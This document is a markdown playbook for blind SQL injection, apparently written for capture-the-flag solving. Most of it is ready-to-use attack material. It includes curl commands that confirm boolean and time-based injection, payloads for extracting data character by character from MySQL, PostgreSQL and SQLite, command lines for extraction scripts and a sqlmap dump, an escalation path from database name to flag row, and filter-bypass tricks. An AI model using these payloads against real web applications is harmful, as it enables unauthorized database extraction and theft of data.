# Web Blind SQL Injection

## When to suspect this

- SQLi probes change response length/status/redirect but no SQL output is printed.
- Login/search/ID endpoint returns yes/no style behavior.
- Time delay payloads affect response time.
- Errors are suppressed, but boolean predicates change page text.
- Rate limits or generic messages hide direct extraction.

## Fast triage checklist

- Find a stable baseline response length.
- Test true and false predicates with the same syntax shape.
- Check if time delays are possible.
- Determine DB flavor from source, stack, or function support.
- Identify one extractable expression: `database()`, `version()`, table name, or flag column.
- Build a one-character boolean test manually.
- Only then automate extraction.

## Manual confirmation

```bash
URL='http://HOST/item?id='
curl -sk "${URL}1 AND 1=1-- -" -w ' len:%{size_download} time:%{time_total}\n' -o /tmp/t
curl -sk "${URL}1 AND 1=2-- -" -w ' len:%{size_download} time:%{time_total}\n' -o /tmp/f
diff -u /tmp/t /tmp/f | sed -n '1,80p'
```

Time checks:

```bash
curl -sk "${URL}1 AND SLEEP(3)-- -" -w 'time:%{time_total}\n' -o /dev/null
curl -sk "${URL}1 AND (SELECT CASE WHEN (1=1) THEN pg_sleep(3) ELSE pg_sleep(0) END)-- -" -w 'time:%{time_total}\n' -o /dev/null
curl -sk "${URL}1 AND randomblob(100000000)-- -" -w 'time:%{time_total}\n' -o /dev/null
```

## Tools and resources to use

| Tool / Script / Resource | When to use | Example command | Expected signal |
|---|---|---|---|
| [scripts/web/blind_sqli_boolean.py](../scripts/web/blind_sqli_boolean.py) | Stable true/false page difference | `python3 scripts/web/blind_sqli_boolean.py --url 'http://HOST/?id=INJECT' --expr 'select sqlite_version()'` | Extracted text |
| [scripts/web/blind_sqli_time.py](../scripts/web/blind_sqli_time.py) | Time-based oracle | `python3 scripts/web/blind_sqli_time.py --url 'http://HOST/?id=INJECT' --db mysql --expr 'database()'` | Extracted text |
| Burp Comparer | Manual response diffing | Compare true/false responses | Stable marker found |
| `sqlmap` | Confirmed injection, need speed | `sqlmap -u 'http://HOST/?id=1' --technique=B --batch --dump` | Extracted rows |

## Payload starter pack

Boolean extraction:

```text
1 AND ASCII(SUBSTR((SELECT database()),1,1))>77-- -
1 AND SUBSTR((SELECT group_concat(name) FROM sqlite_master),1,1)='u'-- -
' AND (SELECT CASE WHEN (SUBSTR((SELECT flag FROM flags),1,1)='f') THEN 1 ELSE 0 END)-- -
```

Time extraction:

```text
1 AND IF(ASCII(SUBSTR((SELECT database()),1,1))>77,SLEEP(3),0)-- -
1;SELECT CASE WHEN (ASCII(SUBSTR((SELECT current_database()),1,1))>77) THEN pg_sleep(3) ELSE pg_sleep(0) END-- -
1 AND CASE WHEN (substr((select group_concat(name) from sqlite_master),1,1)='u') THEN randomblob(100000000) ELSE 1 END-- -
```

## Exploit skeleton

Use the reusable scripts:

```bash
python3 scripts/web/blind_sqli_boolean.py \
  --url 'http://HOST/item?id=INJECT' \
  --true 'Welcome' \
  --template "1 AND ASCII(SUBSTR((EXPR),POS,1))>ORD-- -" \
  --expr "SELECT group_concat(name) FROM sqlite_master" \
  --max-len 80
```

```bash
python3 scripts/web/blind_sqli_time.py \
  --url 'http://HOST/item?id=INJECT' \
  --db mysql \
  --expr "SELECT database()" \
  --delay 3
```

## Escalation path

- Extract DB name/version.
- Extract table names.
- Extract columns for likely tables.
- Extract flag row.
- If too slow, use binary search, chunk extraction, or SQL functions like `group_concat`.
- If rate limited, optimize charset and length discovery.

## Common bypasses

- Replace spaces with comments or newlines.
- Use `LIKE`, `GLOB`, `REGEXP`, `BETWEEN`.
- Use `CASE WHEN` instead of `IF`.
- Use `ASCII`, `ORD`, `HEX`, `SUBSTR`, `MID`, `LEFT`.
- For SQLite time, use heavy functions like `randomblob`.
- For filters, split keywords: `UN/**/ION`, string concat, hex.

## Rabbit holes

- Automating before finding a stable true/false marker.
- Using time-based extraction when boolean output is stable.
- Extracting one char at a time linearly with a huge charset.
- Ignoring response caching.
- Forgetting cookies/CSRF/session state.

## Final solve checklist

- True/false or timing signal is stable over multiple trials.
- Script includes cookie/header placeholders.
- Extracted output is verified with a final direct predicate.
- Final flag source is recorded.

